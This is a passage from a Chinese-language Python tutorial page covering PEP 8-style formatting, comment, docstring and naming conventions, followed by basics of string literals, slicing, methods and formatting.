    <span style="color: #a020f0;">pass</span>
</pre>
</div>

<p>
函数的参数列表中，默认值等号两边不要添加空格<br>
</p>
<div class="org-src-container">
<pre class="src src-python"><span style="color: #b22222;"># </span><span style="color: #b22222;">&#27491;&#30830;&#30340;&#20889;&#27861;</span>
<span style="color: #a020f0;">def</span> <span style="color: #0000ff;">complex</span>(real, imag=0.0):
    <span style="color: #a020f0;">pass</span>
<span style="color: #b22222;"># </span><span style="color: #b22222;">&#19981;&#25512;&#33616;&#30340;&#20889;&#27861;</span>
<span style="color: #a020f0;">def</span> <span style="color: #0000ff;">complex</span>(real, imag = 0.0):
    <span style="color: #a020f0;">pass</span>
</pre>
</div>

<p>
左括号之后，右括号之前不要加多余的空格<br>
</p>
<div class="org-src-container">
<pre class="src src-python"><span style="color: #b22222;"># </span><span style="color: #b22222;">&#27491;&#30830;&#30340;&#20889;&#27861;</span>
spam(ham[1], {eggs: 2})
<span style="color: #b22222;"># </span><span style="color: #b22222;">&#19981;&#25512;&#33616;&#30340;&#20889;&#27861;</span>
spam( ham[1], { eggs : 2 } )
</pre>
</div>

<p>
字典对象的左括号之前不要多余的空格<br>
</p>
<div class="org-src-container">
<pre class="src src-python"><span style="color: #b22222;"># </span><span style="color: #b22222;">&#27491;&#30830;&#30340;&#20889;&#27861;</span>
<span style="color: #483d8b;">dict</span>[<span style="color: #8b2252;">'key'</span>] = <span style="color: #483d8b;">list</span>[index]
<span style="color: #b22222;"># </span><span style="color: #b22222;">&#19981;&#25512;&#33616;&#30340;&#20889;&#27861;</span>
<span style="color: #483d8b;">dict</span> [<span style="color: #8b2252;">'key'</span>] = <span style="color: #483d8b;">list</span> [index]
</pre>
</div>

<p>
不要为对齐赋值语句而使用的额外空格<br>
</p>
<div class="org-src-container">
<pre class="src src-python"><span style="color: #b22222;"># </span><span style="color: #b22222;">&#27491;&#30830;&#30340;&#20889;&#27861;</span>
<span style="color: #a0522d;">x</span> = 1
<span style="color: #a0522d;">y</span> = 2
<span style="color: #a0522d;">long_variable</span> = 3

<span style="color: #b22222;"># </span><span style="color: #b22222;">&#19981;&#25512;&#33616;&#30340;&#20889;&#27861;</span>
<span style="color: #a0522d;">x</span>             = 1
<span style="color: #a0522d;">y</span>             = 2
<span style="color: #a0522d;">long_variable</span> = 3
</pre>
</div>
</div>
</div>
<div id="outline-container-h:4904134f-19a7-4b6a-9406-46ab516b4efd" class="outline-4">
<h4 id="h:4904134f-19a7-4b6a-9406-46ab516b4efd">5、换行</h4>
<div class="outline-text-4" id="text-h:4904134f-19a7-4b6a-9406-46ab516b4efd">
<p>
Python 支持括号内的换行。这时有两种情况。<br>
</p>

<ol class="org-ol">
<li>第二行缩进到括号的起始处<br></li>
</ol>
<div class="org-src-container">
<pre class="src src-python"><span style="color: #a0522d;">foo</span> = long_function_name(var_one, var_two,
                         var_three, var_four)
</pre>
</div>

<ol class="org-ol">
<li>第二行缩进 4 个空格，适用于起始括号就换行的情形<br></li>
</ol>
<div class="org-src-container">
<pre class="src src-python"><span style="color: #a020f0;">def</span> <span style="color: #0000ff;">long_function_name</span>(
        var_one, var_two, var_three,
        var_four):
    <span style="color: #483d8b;">print</span>(var_one)
</pre>
</div>

<p>
使用反斜杠 \ 换行，二元运算符 + . 等应出现在行末；长字符串也可以用此法换行<br>
</p>
<div class="org-src-container">
<pre class="src src-python">session.query(MyTable).\
    filter_by(<span style="color: #483d8b;">id</span>=1).\
    one()

<span style="color: #483d8b;">print</span> <span style="color: #8b2252;">'Hello, '</span>\
    <span style="color: #8b2252;">'%s %s!'</span> %\
    (<span style="color: #8b2252;">'Harry'</span>, <span style="color: #8b2252;">'Potter'</span>)
</pre>
</div>

<p>
禁止复合语句，即一行中包含多个语句：<br>
</p>
<div class="org-src-container">
<pre class="src src-python"><span style="color: #b22222;"># </span><span style="color: #b22222;">&#27491;&#30830;&#30340;&#20889;&#27861;</span>
do_first()
do_second()
do_third()
<span style="color: #b22222;"># </span><span style="color: #b22222;">&#19981;&#25512;&#33616;&#30340;&#20889;&#27861;</span>
do_first();do_second();do_third();
</pre>
</div>

<p>
if/for/while 一定要换行：<br>
</p>
<div class="org-src-container">
<pre class="src src-python"><span style="color: #b22222;"># </span><span style="color: #b22222;">&#27491;&#30830;&#30340;&#20889;&#27861;</span>
<span style="color: #a020f0;">if</span> foo == <span style="color: #8b2252;">'blah'</span>:
   do_blah_thing()
<span style="color: #b22222;"># </span><span style="color: #b22222;">&#19981;&#25512;&#33616;&#30340;&#20889;&#27861;</span>
<span style="color: #a020f0;">if</span> foo == <span style="color: #8b2252;">'blah'</span>: do_blash_thing()
</pre>
</div>
</div>
</div>
<div id="outline-container-h:688f805e-c428-42d1-aa5f-f054db455afe" class="outline-4">
<h4 id="h:688f805e-c428-42d1-aa5f-f054db455afe">6、docstring</h4>
<div class="outline-text-4" id="text-h:688f805e-c428-42d1-aa5f-f054db455afe">
<p>
docstring 的规范中最其本的两点：<br>
</p>
<ol class="org-ol">
<li>所有的公共模块、函数、类、方法，都应该写 docstring 。私有方法不一定需要，但应该在 def 后提供一个块注释来说明。<br></li>
<li>docstring 的结束"""应该独占一行，除非此 docstring 只有一行。<br></li>
</ol>
<div class="org-src-container">
<pre class="src src-python"><span style="color: #8b2252;">"""Return a foobar</span>
<span style="color: #8b2252;">Optional plotz says to frobnicate the bizbaz first.</span>
<span style="color: #8b2252;">"""</span>

<span style="color: #8b2252;">"""Oneline docstring"""</span>
</pre>
</div>
</div>
</div>
</div>
<div id="outline-container-h:cdea3562-cd93-4f5c-95fd-67513671e52c" class="outline-3">
<h3 id="h:cdea3562-cd93-4f5c-95fd-67513671e52c">注释</h3>
<div class="outline-text-3" id="text-h:cdea3562-cd93-4f5c-95fd-67513671e52c">
</div>
<div id="outline-container-h:74fb0dc1-91dd-4493-a4be-278b9b060491" class="outline-4">
<h4 id="h:74fb0dc1-91dd-4493-a4be-278b9b060491">注释</h4>
<div class="outline-text-4" id="text-h:74fb0dc1-91dd-4493-a4be-278b9b060491">
<p>
<b>块注释</b><br>
</p>

<p>
“#”号后空一格，段落件用空行分开（同样需要“#”号）<br>
</p>
<div class="org-src-container">
<pre class="src src-python"><span style="color: #b22222;"># </span><span style="color: #b22222;">&#22359;&#27880;&#37322;</span>
<span style="color: #b22222;"># </span><span style="color: #b22222;">&#22359;&#27880;&#37322;</span>
<span style="color: #b22222;">#</span>
<span style="color: #b22222;"># </span><span style="color: #b22222;">&#22359;&#27880;&#37322;</span>
<span style="color: #b22222;"># </span><span style="color: #b22222;">&#22359;&#27880;&#37322;</span>
</pre>
</div>

<p>
<b>行注释</b><br>
</p>

<p>
至少使用两个空格和语句分开，注意不要使用无意义的注释<br>
</p>
<div class="org-src-container">
<pre class="src src-python"><span style="color: #b22222;"># </span><span style="color: #b22222;">&#27491;&#30830;&#30340;&#20889;&#27861;</span>
<span style="color: #a0522d;">x</span> = x + 1  <span style="color: #b22222;"># </span><span style="color: #b22222;">&#36793;&#26694;&#21152;&#31895;&#19968;&#20010;&#20687;&#32032;</span>

<span style="color: #b22222;"># </span><span style="color: #b22222;">&#19981;&#25512;&#33616;&#30340;&#20889;&#27861;(&#26080;&#24847;&#20041;&#30340;&#27880;&#37322;)</span>
<span style="color: #a0522d;">x</span> = x + 1 <span style="color: #b22222;"># </span><span style="color: #b22222;">x&#21152;1</span>
</pre>
</div>

<p>
建议<br>
</p>
<ul class="org-ul">
<li>在代码的关键部分(或比较复杂的地方), 能写注释的要尽量写注释<br></li>
<li>比较重要的注释段, 使用多个等号隔开, 可以更加醒目, 突出重要性<br></li>
</ul>

<div class="org-src-container">
<pre class="src src-python"><span style="color: #a0522d;">app</span> = create_app(name, options)


<span style="color: #b22222;"># </span><span style="color: #b22222;">=====================================</span>
<span style="color: #b22222;"># </span><span style="color: #b22222;">&#35831;&#21247;&#22312;&#27492;&#22788;&#28155;&#21152; get post&#31561;app&#36335;&#30001;&#34892;&#20026; !!!</span>
<span style="color: #b22222;"># </span><span style="color: #b22222;">=====================================</span>


<span style="color: #a020f0;">if</span> <span style="color: #483d8b;">__name__</span> == <span style="color: #8b2252;">'__main__'</span>:
app.run()
</pre>
</div>
</div>
</div>
<div id="outline-container-h:bd01218a-bf6b-40ee-a182-b7af94bf6ce2" class="outline-4">
<h4 id="h:bd01218a-bf6b-40ee-a182-b7af94bf6ce2">文档注释（Docstring）</h4>
<div class="outline-text-4" id="text-h:bd01218a-bf6b-40ee-a182-b7af94bf6ce2">
<p>
作为文档的Docstring一般出现在模块头部、函数和类的头部，这样在python中可以通过对象的doc对象获取文档。编辑器和IDE也可以根据Docstring给出自动提示。<br>
</p>

<p>
文档注释以 """ 开头和结尾, 首行不换行, 如有多行, 末行必需换行, 以下是Google的docstring风格示例<br>
</p>
<div class="org-src-container">
<pre class="src src-python"><span style="color: #b22222;"># </span><span style="color: #b22222;">-*- coding: utf-8 -*-</span>
<span style="color: #8b2252;">"""Example docstrings.</span>

<span style="color: #8b2252;">This module demonstrates documentation as specified by the `Google Python</span>
<span style="color: #8b2252;">Style Guide`_. Docstrings may extend over multiple lines. Sections are created</span>
<span style="color: #8b2252;">with a section header and a colon followed by a block of indented text.</span>

<span style="color: #8b2252;">Example:</span>
<span style="color: #8b2252;">    Examples can be given using either the ``Example`` or ``Examples``</span>
<span style="color: #8b2252;">    sections. Sections support any reStructuredText formatting, including</span>
<span style="color: #8b2252;">    literal blocks::</span>
<span style="color: #8b2252;">        $ python example_google.py</span>

<span style="color: #8b2252;">Section breaks are created by resuming unindented text. Section breaks</span>
<span style="color: #8b2252;">are also implicitly created anytime a new section starts.</span>
<span style="color: #8b2252;">"""</span>
</pre>
</div>

<p>
不要在文档注释复制函数定义原型, 而是具体描述其具体内容, 解释具体参数和返回值等<br>
</p>
<div class="org-src-container">
<pre class="src src-python"><span style="color: #b22222;"># </span><span style="color: #b22222;">&#19981;&#25512;&#33616;&#30340;&#20889;&#27861;(&#19981;&#35201;&#20889;&#20989;&#25968;&#21407;&#22411;&#31561;&#24223;&#35805;)</span>
<span style="color: #a020f0;">def</span> <span style="color: #0000ff;">function</span>(a, b):
    <span style="color: #8b2252;">"""function(a, b) -&gt; list"""</span>
    ... ...

<span style="color: #b22222;"># </span><span style="color: #b22222;">&#27491;&#30830;&#30340;&#20889;&#27861;</span>
<span style="color: #a020f0;">def</span> <span style="color: #0000ff;">function</span>(a, b):
    <span style="color: #8b2252;">"""&#35745;&#31639;&#24182;&#36820;&#22238;a&#21040;b&#33539;&#22260;&#20869;&#25968;&#25454;&#30340;&#24179;&#22343;&#20540;"""</span>
    ... ...
</pre>
</div>

<p>
对函数参数、返回值等的说明采用numpy标准, 如下所示<br>
</p>
<div class="org-src-container">
<pre class="src src-python"><span style="color: #a020f0;">def</span> <span style="color: #0000ff;">func</span>(arg1, arg2):
    <span style="color: #8b2252;">"""&#22312;&#36825;&#37324;&#20889;&#20989;&#25968;&#30340;&#19968;&#21477;&#35805;&#24635;&#32467;(&#22914;: &#35745;&#31639;&#24179;&#22343;&#20540;).</span>

<span style="color: #8b2252;">    &#36825;&#37324;&#26159;&#20855;&#20307;&#25551;&#36848;.</span>

<span style="color: #8b2252;">    &#21442;&#25968;</span>
<span style="color: #8b2252;">    ----------</span>
<span style="color: #8b2252;">    arg1 : int</span>
<span style="color: #8b2252;">        arg1&#30340;&#20855;&#20307;&#25551;&#36848;</span>
<span style="color: #8b2252;">    arg2 : int</span>
<span style="color: #8b2252;">        arg2&#30340;&#20855;&#20307;&#25551;&#36848;</span>

<span style="color: #8b2252;">    &#36820;&#22238;&#20540;</span>
<span style="color: #8b2252;">    -------</span>
<span style="color: #8b2252;">    int</span>
<span style="color: #8b2252;">        &#36820;&#22238;&#20540;&#30340;&#20855;&#20307;&#25551;&#36848;</span>

<span style="color: #8b2252;">    &#21442;&#30475;</span>
<span style="color: #8b2252;">    --------</span>
<span style="color: #8b2252;">    otherfunc : &#20854;&#23427;&#20851;&#32852;&#20989;&#25968;&#31561;...</span>

<span style="color: #8b2252;">    &#31034;&#20363;</span>
<span style="color: #8b2252;">    --------</span>
<span style="color: #8b2252;">    &#31034;&#20363;&#20351;&#29992;doctest&#26684;&#24335;, &#22312;`&gt;&gt;&gt;`&#21518;&#30340;&#20195;&#30721;&#21487;&#20197;&#34987;&#25991;&#26723;&#27979;&#35797;&#24037;&#20855;&#20316;&#20026;&#27979;&#35797;&#29992;&#20363;&#33258;&#21160;&#36816;&#34892;</span>

<span style="color: #8b2252;">    &gt;&gt;&gt; a=[1,2,3]</span>
<span style="color: #8b2252;">    &gt;&gt;&gt; print [x + 3 for x in a]</span>
<span style="color: #8b2252;">    [4, 5, 6]</span>
<span style="color: #8b2252;">    """</span>
</pre>
</div>

<p>
文档注释不限于中英文, 但不要中英文混用<br>
</p>

<p>
文档注释不是越长越好, 通常一两句话能把情况说清楚即可<br>
</p>

<p>
模块、公有类、公有方法, 能写文档注释的, 应该尽量写文档注释<br>
</p>
</div>
</div>
</div>
<div id="outline-container-h:66b01db0-a6a8-4eac-9ead-6a57d9628188" class="outline-3">
<h3 id="h:66b01db0-a6a8-4eac-9ead-6a57d9628188">命名规范</h3>
<div class="outline-text-3" id="text-h:66b01db0-a6a8-4eac-9ead-6a57d9628188">
</div>
<div id="outline-container-h:3ff63196-bb63-4082-8428-085dd1456da0" class="outline-4">
<h4 id="h:3ff63196-bb63-4082-8428-085dd1456da0">1、模块</h4>
<div class="outline-text-4" id="text-h:3ff63196-bb63-4082-8428-085dd1456da0">
<p>
模块尽量使用小写命名，首字母保持小写，尽量不要用下划线(除非多个单词，且数量不多的情况)<br>
</p>
<div class="org-src-container">
<pre class="src src-python"><span style="color: #b22222;"># </span><span style="color: #b22222;">&#27491;&#30830;&#30340;&#27169;&#22359;&#21517;</span>
<span style="color: #a020f0;">import</span> decoder
<span style="color: #a020f0;">import</span> html_parser

<span style="color: #b22222;"># </span><span style="color: #b22222;">&#19981;&#25512;&#33616;&#30340;&#27169;&#22359;&#21517;</span>
<span style="color: #a020f0;">import</span> Decoder
</pre>
</div>
</div>
</div>
<div id="outline-container-h:8661301d-d278-4f31-bbca-0e19422356fe" class="outline-4">
<h4 id="h:8661301d-d278-4f31-bbca-0e19422356fe">2、类名</h4>
<div class="outline-text-4" id="text-h:8661301d-d278-4f31-bbca-0e19422356fe">
<p>
类名使用驼峰(CamelCase)命名风格，首字母大写，私有类可用一个下划线开头<br>
</p>
<div class="org-src-container">
<pre class="src src-python"><span style="color: #a020f0;">class</span> <span style="color: #228b22;">Farm</span>():
      <span style="color: #a020f0;">pass</span>
<span style="color: #a020f0;">class</span> <span style="color: #228b22;">AnimalFarm</span>(Farm):
      <span style="color: #a020f0;">pass</span>
<span style="color: #a020f0;">class</span> <span style="color: #228b22;">_PrivateFarm</span>(Farm):
      <span style="color: #a020f0;">pass</span>
</pre>
</div>

<p>
将相关的类和顶级函数放在同一个模块里. 不像Java, 没必要限制一个类一个模块.<br>
</p>
</div>
</div>
<div id="outline-container-h:e18887a8-8f23-4cae-83a2-8f08502f2cad" class="outline-4">
<h4 id="h:e18887a8-8f23-4cae-83a2-8f08502f2cad">3、函数</h4>
<div class="outline-text-4" id="text-h:e18887a8-8f23-4cae-83a2-8f08502f2cad">
<ul class="org-ul">
<li><p>
函数名一律小写，如有多个单词，用下划线隔开<br>
</p>
<div class="org-src-container">
<pre class="src src-python"><span style="color: #a020f0;">def</span> <span style="color: #0000ff;">run</span>():
    <span style="color: #a020f0;">pass</span>
<span style="color: #a020f0;">def</span> <span style="color: #0000ff;">run_with_env</span>():
    <span style="color: #a020f0;">pass</span>
</pre>
</div></li>

<li><p>
私有函数在函数前加一个下划线_<br>
</p>
<div class="org-src-container">
<pre class="src src-python"><span style="color: #a020f0;">class</span> <span style="color: #228b22;">Person</span>():

    <span style="color: #a020f0;">def</span> <span style="color: #0000ff;">_private_func</span>():
        <span style="color: #a020f0;">pass</span>
</pre>
</div></li>
</ul>
</div>
</div>
<div id="outline-container-h:4f63d038-3c71-411e-b315-7ff866e5bbd1" class="outline-4">
<h4 id="h:4f63d038-3c71-411e-b315-7ff866e5bbd1">4、变量名</h4>
<div class="outline-text-4" id="text-h:4f63d038-3c71-411e-b315-7ff866e5bbd1">
<ul class="org-ul">
<li><p>
变量名尽量小写, 如有多个单词，用下划线隔开<br>
</p>
<div class="org-src-container">
<pre class="src src-python"><span style="color: #a020f0;">if</span> <span style="color: #483d8b;">__name__</span> == <span style="color: #8b2252;">'__main__'</span>:
    <span style="color: #a0522d;">count</span> = 0
    <span style="color: #a0522d;">school_name</span> = <span style="color: #8b2252;">''</span>
</pre>
</div></li>
<li><p>
常量采用全大写，如有多个单词，使用下划线隔开<br>
</p>
<div class="org-src-container">
<pre class="src src-python"><span style="color: #a0522d;">MAX_CLIENT</span> = 100
<span style="color: #a0522d;">MAX_CONNECTION</span> = 1000
<span style="color: #a0522d;">CONNECTION_TIMEOUT</span> = 600
</pre>
</div></li>
</ul>
</div>
</div>
<div id="outline-container-h:dce1de12-c262-4e04-81f5-666251a6a029" class="outline-4">
<h4 id="h:dce1de12-c262-4e04-81f5-666251a6a029">5、常量</h4>
<div class="outline-text-4" id="text-h:dce1de12-c262-4e04-81f5-666251a6a029">
<ul class="org-ul">
<li><p>
常量使用以下划线分隔的大写命名<br>
</p>
<div class="org-src-container">
<pre class="src src-python"><span style="color: #a0522d;">MAX_OVERFLOW</span> = 100

Class FooBar:

    <span style="color: #a020f0;">def</span> <span style="color: #0000ff;">foo_bar</span>(<span style="color: #a020f0;">self</span>, print_):
        <span style="color: #483d8b;">print</span>(print_)
</pre>
</div></li>
</ul>
</div>
</div>
</div>
<div id="outline-container-h:bb2b3d75-fb9c-4cb4-a7eb-bd7e1fb8ab4e" class="outline-3">
<h3 id="h:bb2b3d75-fb9c-4cb4-a7eb-bd7e1fb8ab4e">Python字符串</h3>
<div class="outline-text-3" id="text-h:bb2b3d75-fb9c-4cb4-a7eb-bd7e1fb8ab4e">
</div>
<div id="outline-container-h:3087ce68-725a-461a-9d14-120a5a17b460" class="outline-4">
<h4 id="h:3087ce68-725a-461a-9d14-120a5a17b460">字符串字面量</h4>
<div class="outline-text-4" id="text-h:3087ce68-725a-461a-9d14-120a5a17b460">
<p>
python 中的字符串字面量由单引号或双引号括起。<br>
</p>

<p>
'hello Cici' 等于 "hello Cici"。<br>
</p>

<p>
我们可以使用 print() 函数显示字符串字面量：<br>
</p>

<p>
实例<br>
</p>
<div class="org-src-container">
<pre class="src src-python"><span style="color: #483d8b;">print</span>(<span style="color: #8b2252;">"Hello Cici"</span>)
<span style="color: #483d8b;">print</span>(<span style="color: #8b2252;">'Hello Cici'</span>)
</pre>
</div>
</div>
</div>
<div id="outline-container-h:e4bc7bb5-541c-411e-a615-f177daa6496d" class="outline-4">
<h4 id="h:e4bc7bb5-541c-411e-a615-f177daa6496d">用字符串向变量赋值</h4>
<div class="outline-text-4" id="text-h:e4bc7bb5-541c-411e-a615-f177daa6496d">
<p>
通过使用变量名称后跟等号和字符串，可以把字符串赋值给变量：<br>
</p>

<p>
实例<br>
</p>
<div class="org-src-container">
<pre class="src src-python"><span style="color: #a0522d;">a</span> = <span style="color: #8b2252;">"Hello Cici"</span>
<span style="color: #483d8b;">print</span>(a)
</pre>
</div>
</div>
</div>
<div id="outline-container-h:c81829c2-d531-471d-a0be-fc9e45791f29" class="outline-4">
<h4 id="h:c81829c2-d531-471d-a0be-fc9e45791f29">多行字符串</h4>
<div class="outline-text-4" id="text-h:c81829c2-d531-471d-a0be-fc9e45791f29">
<p>
您可以使用三个引号将多行字符串赋值给变量：<br>
</p>

<p>
实例<br>
您可以使用三个双引号：<br>
</p>
<div class="org-src-container">
<pre class="src src-python"><span style="color: #a0522d;">cici</span> = <span style="color: #8b2252;">"""linux</span>
<span style="color: #8b2252;">archlinux."""</span>
<span style="color: #483d8b;">print</span>(cici)
</pre>
</div>

<p>
或三个单引号：<br>
</p>

<p>
实例<br>
</p>
<div class="org-src-container">
<pre class="src src-python"><span style="color: #a0522d;">cici</span> = <span style="color: #8b2252;">'''abc</span>
<span style="color: #8b2252;">def</span>
<span style="color: #8b2252;">aaaaaa.'''</span>
<span style="color: #483d8b;">print</span>(cici)
</pre>
</div>
</div>
</div>
<div id="outline-container-h:ba989442-eb19-4f68-a5c5-e8ba6b313942" class="outline-4">
<h4 id="h:ba989442-eb19-4f68-a5c5-e8ba6b313942">字符串是数组</h4>
<div class="outline-text-4" id="text-h:ba989442-eb19-4f68-a5c5-e8ba6b313942">
<p>
像许多其他流行的编程语言一样，Python 中的字符串是表示 unicode 字符的字节数组。<br>
</p>

<p>
但是，Python 没有字符数据类型，单个字符就是长度为 1 的字符串。<br>
</p>

<p>
方括号可用于访问字符串的元素。<br>
</p>

<p>
实例<br>
获取位置 1 处的字符（请记住第一个字符的位置为 0）：<br>
</p>
<div class="org-src-container">
<pre class="src src-python"><span style="color: #a0522d;">cici</span> = <span style="color: #8b2252;">"Hello, World!"</span>
<span style="color: #483d8b;">print</span>(a[1])
</pre>
</div>

<ul class="org-ul">
<li><p>
裁切<br>
您可以使用裁切语法返回一定范围的字符。<br>
指定开始索引和结束索引，以冒号分隔，以返回字符串的一部分。<br>
</p>

<p>
实例- 获取从位置 3 到位置 5（不包括）的字符：<br>
</p>
<div class="org-src-container">
<pre class="src src-python"><span style="color: #a0522d;">b</span> = <span style="color: #8b2252;">"Hello, World!"</span>
<span style="color: #483d8b;">print</span>(b[3:5])
</pre>
</div></li>

<li><p>
负的索引<br>
使用负索引从字符串末尾开始切片：<br>
实例-获取从位置 5 到位置 3 的字符，从字符串末尾开始计数：<br>
</p>
<div class="org-src-container">
<pre class="src src-python"><span style="color: #a0522d;">b</span> = <span style="color: #8b2252;">"Hello, World!"</span>
<span style="color: #483d8b;">print</span>(b[-5:-3])
</pre>
</div></li>
<li><p>
字符串长度<br>
如需获取字符串的长度，请使用 len() 函数。<br>
实例-len() 函数返回字符串的长度：<br>
</p>
<div class="org-src-container">
<pre class="src src-python"><span style="color: #a0522d;">a</span> = <span style="color: #8b2252;">"Hello, Cici!"</span>
<span style="color: #483d8b;">print</span>(<span style="color: #483d8b;">len</span>(a))
</pre>
</div></li>
</ul>
</div>
</div>
<div id="outline-container-h:9890672a-6f4a-495d-99a9-b021efde6f3b" class="outline-4">
<h4 id="h:9890672a-6f4a-495d-99a9-b021efde6f3b">字符串方法</h4>
<div class="outline-text-4" id="text-h:9890672a-6f4a-495d-99a9-b021efde6f3b">
<p>
Python 有一组可用于字符串的内置方法。<br>
</p>

<ul class="org-ul">
<li><p>
实例-strip() 方法删除开头和结尾的空白字符：<br>
</p>
<div class="org-src-container">
<pre class="src src-python"><span style="color: #a0522d;">a</span> = <span style="color: #8b2252;">" Hello, Cici! "</span>
<span style="color: #483d8b;">print</span>(a.strip()) <span style="color: #b22222;"># </span><span style="color: #b22222;">returns "Hello, Cici!"</span>
</pre>
</div></li>
<li><p>
实例- lower() 返回小写的字符串：<br>
</p>
<div class="org-src-container">
<pre class="src src-python"><span style="color: #a0522d;">a</span> = <span style="color: #8b2252;">"Hello, Cici!"</span>
<span style="color: #483d8b;">print</span>(a.lower())
</pre>
</div></li>
<li><p>
实例-upper() 方法返回大写的字符串：<br>
</p>
<div class="org-src-container">
<pre class="src src-python"><span style="color: #a0522d;">a</span> = <span style="color: #8b2252;">"Hello, Cici!"</span>
<span style="color: #483d8b;">print</span>(a.upper())
</pre>
</div></li>
<li><p>
实例-replace() 用另一段字符串来替换字符串：<br>
</p>
<div class="org-src-container">
<pre class="src src-python"><span style="color: #a0522d;">a</span> = <span style="color: #8b2252;">"Hello, Cici!"</span>
<span style="color: #483d8b;">print</span>(a.replace(<span style="color: #8b2252;">"World"</span>, <span style="color: #8b2252;">"Kitty"</span>))
</pre>
</div></li>
<li><p>
实例-split() 方法在找到分隔符的实例时将字符串拆分为子字符串：<br>
</p>
<div class="org-src-container">
<pre class="src src-python"><span style="color: #a0522d;">a</span> = <span style="color: #8b2252;">"Hello, Cici!"</span>
<span style="color: #483d8b;">print</span>(a.split(<span style="color: #8b2252;">","</span>)) <span style="color: #b22222;"># </span><span style="color: #b22222;">returns ['Hello', ' Cici!']</span>
</pre>
</div>
<p>
请使用我们的字符串方法参考手册，学习更多的字符串方法。<br>
</p></li>
</ul>
</div>
</div>
<div id="outline-container-h:61b2d66c-4aa1-466f-8dc1-f7ce6223e17a" class="outline-4">
<h4 id="h:61b2d66c-4aa1-466f-8dc1-f7ce6223e17a">检查字符串</h4>
<div class="outline-text-4" id="text-h:61b2d66c-4aa1-466f-8dc1-f7ce6223e17a">
<p>
如需检查字符串中是否存在特定短语或字符，我们可以使用 in 或 not in 关键字。<br>
</p>

<ul class="org-ul">
<li><p>
检查以下文本中是否存在短语 "Cici"：<br>
</p>
<div class="org-src-container">
<pre class="src src-python"><span style="color: #a0522d;">txt</span> = <span style="color: #8b2252;">"Cici is a great company"</span>
<span style="color: #a0522d;">x</span> = <span style="color: #8b2252;">"edu"</span> <span style="color: #a020f0;">in</span> txt
<span style="color: #483d8b;">print</span>(x)
</pre>
</div></li>
<li><p>
检查以下文本中是否没有短语 "Cici"：<br>
</p>
<div class="org-src-container">
<pre class="src src-python"><span style="color: #a0522d;">txt</span> = <span style="color: #8b2252;">"Cici is a great company"</span>
<span style="color: #a0522d;">x</span> = <span style="color: #8b2252;">"edu"</span> <span style="color: #a020f0;">not</span> <span style="color: #a020f0;">in</span> txt
<span style="color: #483d8b;">print</span>(x)
</pre>
</div></li>
</ul>
</div>
</div>
<div id="outline-container-h:aadaa3c0-af4d-4305-885b-63e7028e6c4c" class="outline-4">
<h4 id="h:aadaa3c0-af4d-4305-885b-63e7028e6c4c">字符串级联（串联）</h4>
<div class="outline-text-4" id="text-h:aadaa3c0-af4d-4305-885b-63e7028e6c4c">
<p>
如需串联或组合两个字符串，您可以使用 + 运算符。<br>
</p>

<ul class="org-ul">
<li><p>
实例-将变量 a 与变量 b 合并到变量 c 中：<br>
</p>
<div class="org-src-container">
<pre class="src src-python"><span style="color: #a0522d;">a</span> = <span style="color: #8b2252;">"Hello"</span>
<span style="color: #a0522d;">b</span> = <span style="color: #8b2252;">"Cici"</span>
<span style="color: #a0522d;">c</span> = a + b
<span style="color: #483d8b;">print</span>(c)
</pre>
</div></li>
<li><p>
实例-在它们之间添加一个空格：<br>
</p>
<div class="org-src-container">
<pre class="src src-python"><span style="color: #a0522d;">a</span> = <span style="color: #8b2252;">"Hello"</span>
<span style="color: #a0522d;">b</span> = <span style="color: #8b2252;">"Cici"</span>
<span style="color: #a0522d;">c</span> = a + <span style="color: #8b2252;">" "</span> + b
<span style="color: #483d8b;">print</span>(c)
</pre>
</div></li>
</ul>
</div>
</div>
<div id="outline-container-h:5b3d2604-a0a8-4304-ae6f-15dcfd491216" class="outline-4">
<h4 id="h:5b3d2604-a0a8-4304-ae6f-15dcfd491216">字符串格式</h4>
<div class="outline-text-4" id="text-h:5b3d2604-a0a8-4304-ae6f-15dcfd491216">
<p>
正如在 Python 变量一章中所学到的，我们不能像这样组合字符串和数字：<br>
</p>

<ul class="org-ul">
<li><p>
实例<br>
</p>
<div class="org-src-container">
<pre class="src src-python"><span style="color: #a0522d;">age</span> = 100
<span style="color: #a0522d;">txt</span> = <span style="color: #8b2252;">"My name is cici, I am "</span> + age
<span style="color: #483d8b;">print</span>(txt)
</pre>
</div>
<p>
但是我们可以使用 format() 方法组合字符串和数字！<br>
</p>

<p>
format() 方法接受传递的参数，格式化它们，并将它们放在占位符 {} 所在的字符串中：<br>
</p></li>
<li><p>
实例-使用 format() 方法将数字插入字符串：<br>
</p>
<div class="org-src-container">
<pre class="src src-python"><span style="color: #a0522d;">age</span> = 100
<span style="color: #a0522d;">txt</span> = <span style="color: #8b2252;">"My name is Cici, and I am {} years old"</span>
<span style="color: #483d8b;">print</span>(txt.<span style="color: #483d8b;">format</span>(age))
</pre>
</div>
<p>
format() 方法接受不限数量的参数，并放在各自的占位符中：<br>
</p></li>
<li><p>
实例<br>
</p>
<div class="org-src-container">
<pre class="src src-python"><span style="color: #a0522d;">quantity</span> = 3
<span style="color: #a0522d;">itemno</span> = 567
<span style="color: #a0522d;">price</span> = 49.95
<span style="color: #a0522d;">myorder</span> = <span style="color: #8b2252;">"I want {} pieces of item {} for {} dollars."</span>
<span style="color: #483d8b;">print</span>(myorder.<span style="color: #483d8b;">format</span>(quantity, itemno, price))
</pre>
</div>
<p>
可以使用索引号 {0} 来确保参数被放在正确的占位符中：<br>
</p></li>
<li><p>
实例<br>
</p>
<div class="org-src-container">
<pre class="src src-python"><span style="color: #a0522d;">quantity</span> = 300
<span style="color: #a0522d;">itemno</span> = 567
<span style="color: #a0522d;">price</span> = 49.95
<span style="color: #a0522d;">myorder</span> = <span style="color: #8b2252;">"I want to pay {2} dollars for {0} pieces of item {1}."</span>
<span style="color: #483d8b;">print</span>(myorder.<span style="color: #483d8b;">format</span>(quantity, itemno, price))
</pre>
</div></li>
</ul>
</div>
</div>
<div id="outline-container-h:8db06633-2ae9-489c-882c-2fd8fb9defb9" class="outline-4">
<h4 id="h:8db06633-2ae9-489c-882c-2fd8fb9defb9">Python 用作计算器</h4>
<div class="outline-text-4" id="text-h:8db06633-2ae9-489c-882c-2fd8fb9defb9">
<p>
<a href="https://docs.python.org/zh-cn/3/tutorial/introduction.html#using-python-as-a-calculator">https://docs.python.org/zh-cn/3/tutorial/introduction.html#using-python-as-a-calculator</a><br>
</p>

<p>
现在，尝试一些简单的 Python 命令。启动解释器，等待主提示符（ &gt;&gt;&gt; ）出现。<br>
</p>
</div>
</div>
